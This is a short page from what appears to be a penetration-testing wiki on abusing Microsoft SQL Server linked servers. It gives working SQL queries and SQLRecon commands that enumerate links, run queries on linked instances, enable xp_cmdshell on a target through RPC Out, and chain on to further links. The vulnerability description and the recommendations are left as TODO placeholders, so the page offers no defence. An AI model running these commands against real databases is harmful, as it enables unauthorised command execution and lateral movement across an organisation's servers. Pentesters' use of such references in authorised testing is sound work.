---
layout: default
title: Links Abuse
parent: Microsoft SQL
grand_parent: Databases
nav_order: 1
permalink: /databases/mssql/links/
---

# Links Abuse
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

TODO: Describe the vulnerability here.

## Prerequisites

* Having sysadmin rights on the Microsoft SQL instance.

## Exploit

To enumerate links with you instance, use `SELECT srvname, srvproduct, rpcout FROM master..sysservers;` query or [SQLRecon](https://github.com/skahwah/SQLRecon).

```powershell
./SQLRecon.exe /a:wintoken /h:$hostname,$port /m:links
```

To send a query to a linked instance, use `SELECT * FROM OPENQUERY("$target", '$query');` or - *again* - [SQLRecon](https://github.com/skahwah/SQLRecon).

```powershell
./SQLRecon.exe /a:wintoken /h:$hostname,$port /m:lquery /l:$target /c:"$query"
```

If *RPC Out* is enabled on the link, you can leverage it to enable [xp_cmdshell](/databases/mssql/cmdshell/) with following queries.

```sql
EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [$target]
EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [$target]
```

You can even list any further links on your target and renew the operation.

```powershell
./SQLRecon.exe /a:wintoken /h:$hostname,$port /m:llinks /l:$target
```

## Useful links

* TODO: List links here.

## Recommendations

- [ ] TODO: List recommendations here.